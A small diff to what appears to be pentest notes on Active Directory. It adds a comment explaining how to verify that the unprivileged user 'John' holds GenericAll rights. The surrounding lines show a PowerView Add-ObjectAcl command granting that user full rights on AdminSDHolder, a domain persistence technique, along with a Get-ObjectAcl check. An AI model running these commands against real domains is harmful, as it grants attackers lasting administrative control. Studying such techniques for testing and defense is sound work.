@@ -3,6 +3,9 @@
 The User John has granted GenericAll Privilege.
 
 Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName Joh -Verbose -Rights All
+
+#The Following could be verify whether The unprivilege user John has GenericAll rights on the AdminSDHolder.
+
 Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'John'}
 
 ```
